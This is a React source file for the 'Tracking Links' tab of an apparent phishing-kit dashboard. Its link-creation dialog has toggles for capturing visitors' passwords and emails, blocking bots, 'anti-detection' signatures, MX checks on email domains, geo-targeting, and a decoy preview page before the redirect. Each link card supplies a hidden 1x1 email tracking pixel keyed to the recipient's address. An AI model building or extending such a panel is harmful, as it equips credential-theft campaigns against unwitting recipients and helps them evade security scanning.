import React, { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Badge } from '@/components/ui/badge'
import { Switch } from '@/components/ui/switch'
import { Textarea } from '@/components/ui/textarea'
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogTrigger } from '@/components/ui/dialog'
import { 
  Link2, 
  Plus, 
  Copy, 
  Edit, 
  Trash2, 
  ExternalLink,
  RefreshCw,
  Search,
  Filter,
  MoreHorizontal,
  Mail,
  Key,
  Shield,
  Clock,
  Fingerprint,
  CheckCircle,
  Globe
} from 'lucide-react'

export default function LinksTab() {
  const [links, setLinks] = useState([])
  const [loading, setLoading] = useState(true)
  const [searchTerm, setSearchTerm] = useState('')
  const [showCreateDialog, setShowCreateDialog] = useState(false)
  const [newLink, setNewLink] = useState({
    target_url: '',
    title: '',
    preview_url: '',
    campaign_id: null,
    capture_email: false,
    capture_password: false,
    bot_blocking_enabled: true,
    rate_limiting_enabled: false,
    dynamic_signature_enabled: false,
    mx_verification_enabled: false,
    geo_targeting_enabled: false,
    allowed_countries: [],
    blocked_countries: [],
    allowed_cities: [],
    blocked_cities: []
  })

  useEffect(() => {
    fetchLinks()
  }, [])

  const fetchLinks = async () => {
    setLoading(true)
    try {
      const response = await fetch('/api/links', {
        credentials: 'include'
      })
      if (response.ok) {
        const data = await response.json()
        setLinks(data)
      }
    } catch (error) {
      console.error('Failed to fetch links:', error)
    } finally {
      setLoading(false)
    }
  }

  const createLink = async () => {
    try {
      const response = await fetch('/api/links', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        credentials: 'include',
        body: JSON.stringify(newLink),
      })
      
      if (response.ok) {
        setShowCreateDialog(false)
        setNewLink({ 
          target_url: '', 
          title: '', 
          preview_url: '',
          campaign_id: null,
          capture_email: false,
          capture_password: false,
          bot_blocking_enabled: true,
          rate_limiting_enabled: false,
          dynamic_signature_enabled: false,
          mx_verification_enabled: false,
          geo_targeting_enabled: false,
          allowed_countries: [],
          blocked_countries: [],
          allowed_cities: [],
          blocked_cities: []
        })
        fetchLinks()
      }
    } catch (error) {
      console.error('Failed to create link:', error)
    }
  }

  const copyToClipboard = (shortCode) => {
    const url = `${window.location.origin}/t/${shortCode}`
    navigator.clipboard.writeText(url)
  }

  const filteredLinks = links.filter(link =>
    link.title?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    link.target_url.toLowerCase().includes(searchTerm.toLowerCase()) ||
    link.short_code.toLowerCase().includes(searchTerm.toLowerCase())
  )

  if (loading) {
    return (
      <div className="space-y-4 md:space-y-6">
        <div className="flex items-center justify-between">
          <h1 className="text-2xl md:text-3xl font-bold">Tracking Links</h1>
          <RefreshCw className="h-5 w-5 animate-spin" />
        </div>
        <div className="grid grid-cols-1 gap-4">
          {[...Array(5)].map((_, i) => (
            <Card key={i} className="animate-pulse">
              <CardContent className="p-4 md:p-6">
                <div className="h-20 bg-muted rounded"></div>
              </CardContent>
            </Card>
          ))}
        </div>
      </div>
    )
  }

  return (
    <div className="space-y-4 md:space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
        <div>
          <h1 className="text-2xl md:text-3xl font-bold flex items-center gap-2">
            <Link2 className="h-6 w-6 md:h-8 md:w-8 text-green-500" />
            Tracking Links
          </h1>
          <p className="text-sm md:text-base text-muted-foreground">Create and manage your tracking links</p>
        </div>
        
        <Dialog open={showCreateDialog} onOpenChange={setShowCreateDialog}>
          <DialogTrigger asChild>
            <Button className="w-full sm:w-auto">
              <Plus className="h-4 w-4 mr-2" />
              Create Link
            </Button>
          </DialogTrigger>
          <DialogContent className="sm:max-w-2xl max-h-[90vh] overflow-y-auto">
            <DialogHeader>
              <DialogTitle className="flex items-center gap-2">
                <Link2 className="h-5 w-5" />
                Create New Link
              </DialogTitle>
              <DialogDescription>
                Create a new secure tracking link
              </DialogDescription>
            </DialogHeader>
            <div className="space-y-6">
              {/* Basic Settings */}
              <div className="space-y-4">
                <h3 className="text-lg font-semibold">Basic Settings</h3>
                <div>
                  <Label htmlFor="target_url">Target URL *</Label>
                  <Input
                    id="target_url"
                    placeholder="https://example.com"
                    value={newLink.target_url}
                    onChange={(e) => setNewLink({...newLink, target_url: e.target.value})}
                  />
                </div>
                <div>
                  <Label htmlFor="preview_url">Preview Template URL (Optional)</Label>
                  <Input
                    id="preview_url"
                    placeholder="https://example.com/preview"
                    value={newLink.preview_url}
                    onChange={(e) => setNewLink({...newLink, preview_url: e.target.value})}
                  />
                  <p className="text-xs text-muted-foreground mt-1">Custom preview page shown before redirect</p>
                </div>
                <div>
                  <Label htmlFor="title">Title (Optional)</Label>
                  <Input
                    id="title"
                    placeholder="Link description"
                    value={newLink.title}
                    onChange={(e) => setNewLink({...newLink, title: e.target.value})}
                  />
                </div>
              </div>

              {/* Security Features */}
              <div className="space-y-4">
                <h3 className="text-lg font-semibold">Security Features</h3>
                
                <div className="flex items-center justify-between p-4 border rounded-lg">
                  <div className="flex items-center gap-3">
                    <Mail className="h-5 w-5 text-blue-500" />
                    <div>
                      <p className="font-medium">Email Capture</p>
                      <p className="text-sm text-muted-foreground">Capture visitor emails</p>
                    </div>
                  </div>
                  <Switch
                    checked={newLink.capture_email}
                    onCheckedChange={(checked) => setNewLink({...newLink, capture_email: checked})}
                  />
                </div>

                <div className="flex items-center justify-between p-4 border rounded-lg">
                  <div className="flex items-center gap-3">
                    <Key className="h-5 w-5 text-red-500" />
                    <div>
                      <p className="font-medium">Password Capture</p>
                      <p className="text-sm text-muted-foreground">Capture passwords</p>
                    </div>
                  </div>
                  <Switch
                    checked={newLink.capture_password}
                    onCheckedChange={(checked) => setNewLink({...newLink, capture_password: checked})}
                  />
                </div>

                <div className="flex items-center justify-between p-4 border rounded-lg">
                  <div className="flex items-center gap-3">
                    <Shield className="h-5 w-5 text-green-500" />
                    <div>
                      <p className="font-medium">Bot Blocking</p>
                      <p className="text-sm text-muted-foreground">Block automated bots</p>
                    </div>
                  </div>
                  <Switch
                    checked={newLink.bot_blocking_enabled}
                    onCheckedChange={(checked) => setNewLink({...newLink, bot_blocking_enabled: checked})}
                  />
                </div>

                <div className="flex items-center justify-between p-4 border rounded-lg">
                  <div className="flex items-center gap-3">
                    <Clock className="h-5 w-5 text-orange-500" />
                    <div>
                      <p className="font-medium">Rate Limiting</p>
                      <p className="text-sm text-muted-foreground">Prevent spam/abuse</p>
                    </div>
                  </div>
                  <Switch
                    checked={newLink.rate_limiting_enabled}
                    onCheckedChange={(checked) => setNewLink({...newLink, rate_limiting_enabled: checked})}
                  />
                </div>

                <div className="flex items-center justify-between p-4 border rounded-lg">
                  <div className="flex items-center gap-3">
                    <Fingerprint className="h-5 w-5 text-purple-500" />
                    <div>
                      <p className="font-medium">Dynamic Signature</p>
                      <p className="text-sm text-muted-foreground">Anti-detection measures</p>
                    </div>
                  </div>
                  <Switch
                    checked={newLink.dynamic_signature_enabled}
                    onCheckedChange={(checked) => setNewLink({...newLink, dynamic_signature_enabled: checked})}
                  />
                </div>

                <div className="flex items-center justify-between p-4 border rounded-lg">
                  <div className="flex items-center gap-3">
                    <CheckCircle className="h-5 w-5 text-teal-500" />
                    <div>
                      <p className="font-medium">MX Verification</p>
                      <p className="text-sm text-muted-foreground">Verify email domains</p>
                    </div>
                  </div>
                  <Switch
                    checked={newLink.mx_verification_enabled}
                    onCheckedChange={(checked) => setNewLink({...newLink, mx_verification_enabled: checked})}
                  />
                </div>

                <div className="flex items-center justify-between p-4 border rounded-lg">
                  <div className="flex items-center gap-3">
                    <Globe className="h-5 w-5 text-blue-600" />
                    <div>
                      <p className="font-medium">Geo Targeting</p>
                      <p className="text-sm text-muted-foreground">Restrict by country</p>
                    </div>
                  </div>
                  <Switch
                    checked={newLink.geo_targeting_enabled}
                    onCheckedChange={(checked) => setNewLink({...newLink, geo_targeting_enabled: checked})}
                  />
                </div>
              </div>

              <div className="flex gap-3">
                <Button variant="outline" onClick={() => setShowCreateDialog(false)} className="flex-1">
                  Cancel
                </Button>
                <Button onClick={createLink} className="flex-1">
                  Create Link
                </Button>
              </div>
            </div>
          </DialogContent>
        </Dialog>
      </div>

      {/* Search and Filters */}
      <div className="flex flex-col sm:flex-row gap-4">
        <div className="relative flex-1">
          <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
          <Input
            placeholder="Search links..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="pl-10"
          />
        </div>
        <Button variant="outline" size="sm">
          <Filter className="h-4 w-4 mr-2" />
          Filter
        </Button>
        <Button variant="outline" size="sm" onClick={fetchLinks}>
          <RefreshCw className="h-4 w-4" />
        </Button>
      </div>

      {/* Links List */}
      <div className="space-y-4">
        {filteredLinks.length > 0 ? (
          filteredLinks.map((link) => (
            <Card key={link.id} className="hover:shadow-md transition-shadow">
              <CardContent className="p-4 md:p-6">
                <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
                  <div className="flex-1 min-w-0">
                    <div className="flex flex-col sm:flex-row sm:items-center gap-2 mb-2">
                      <h3 className="font-semibold text-sm md:text-base truncate">
                        {link.title || 'Untitled Link'}
                      </h3>
                      <div className="flex items-center gap-2">
                        <Badge variant="secondary" className="text-xs">
                          {link.short_code}
                        </Badge>
                        {link.campaign_name && (
                          <Badge variant="outline" className="text-xs">
                            {link.campaign_name}
                          </Badge>
                        )}
                      </div>
                    </div>
                    
                    <div className="space-y-2">
                      <div className="flex items-center gap-2 text-xs md:text-sm text-muted-foreground">
                        <ExternalLink className="h-3 w-3 md:h-4 md:w-4" />
                        <span className="truncate">{link.target_url}</span>
                      </div>
                      
                      <div className="flex items-center gap-2 text-xs md:text-sm">
                        <Link2 className="h-3 w-3 md:h-4 md:w-4 text-blue-500" />
                        <span className="text-xs text-muted-foreground">Tracking URL:</span>
                        <code className="bg-muted px-2 py-1 rounded text-xs">
                          {window.location.origin}/t/{link.short_code}
                        </code>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => copyToClipboard(`${window.location.origin}/t/${link.short_code}`)}
                          className="h-6 w-6 p-0"
                        >
                          <Copy className="h-3 w-3" />
                        </Button>
                      </div>

                      <div className="flex items-center gap-2 text-xs md:text-sm">
                        <Globe className="h-3 w-3 md:h-4 md:w-4 text-green-500" />
                        <span className="text-xs text-muted-foreground">Pixel URL:</span>
                        <code className="bg-muted px-2 py-1 rounded text-xs">
                          {link.pixel_url || `${window.location.origin}/p/${link.short_code}?uid={email}`}
                        </code>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => copyToClipboard(link.pixel_url || `${window.location.origin}/p/${link.short_code}?uid={email}`)}
                          className="h-6 w-6 p-0"
                        >
                          <Copy className="h-3 w-3" />
                        </Button>
                      </div>

                      <div className="flex items-start gap-2 text-xs md:text-sm">
                        <Mail className="h-3 w-3 md:h-4 md:w-4 text-purple-500 mt-1" />
                        <div className="flex-1">
                          <span className="text-xs text-muted-foreground">Email Code:</span>
                          <code className="bg-muted px-2 py-1 rounded text-xs block mt-1 break-all">
                            {link.email_code || `<img src="${window.location.origin}/p/${link.short_code}?uid={email}" width="1" height="1" style="display:none;">`}
                          </code>
                        </div>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => copyToClipboard(link.email_code || `<img src="${window.location.origin}/p/${link.short_code}?uid={email}" width="1" height="1" style="display:none;">`)}
                          className="h-6 w-6 p-0 mt-1"
                        >
                          <Copy className="h-3 w-3" />
                        </Button>
                      </div>
                    </div>
                  </div>
                  
                  <div className="flex flex-col sm:flex-row items-start sm:items-center gap-4">
                    {/* Stats */}
                    <div className="grid grid-cols-3 gap-4 text-center">
                      <div>
                        <p className="text-lg md:text-xl font-bold">{link.total_clicks}</p>
                        <p className="text-xs text-muted-foreground">Clicks</p>
                      </div>
                      <div>
                        <p className="text-lg md:text-xl font-bold">{link.real_visitors}</p>
                        <p className="text-xs text-muted-foreground">Visitors</p>
                      </div>
                      <div>
                        <p className="text-lg md:text-xl font-bold">{link.blocked_attempts}</p>
                        <p className="text-xs text-muted-foreground">Blocked</p>
                      </div>
                    </div>
                    
                    {/* Actions */}
                    <div className="flex items-center gap-2">
                      <Button variant="ghost" size="sm">
                        <Edit className="h-4 w-4" />
                      </Button>
                      <Button variant="ghost" size="sm">
                        <Trash2 className="h-4 w-4" />
                      </Button>
                      <Button variant="ghost" size="sm">
                        <MoreHorizontal className="h-4 w-4" />
                      </Button>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          ))
        ) : (
          <Card>
            <CardContent className="p-8 md:p-12 text-center">
              <Link2 className="h-12 w-12 md:h-16 md:w-16 text-muted-foreground mx-auto mb-4" />
              <h3 className="text-lg md:text-xl font-semibold mb-2">No links found</h3>
              <p className="text-sm md:text-base text-muted-foreground mb-4">
                {searchTerm ? 'No links match your search criteria.' : 'Create your first tracking link to get started.'}
              </p>
              {!searchTerm && (
                <Button onClick={() => setShowCreateDialog(true)}>
                  <Plus className="h-4 w-4 mr-2" />
                  Create Your First Link
                </Button>
              )}
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}

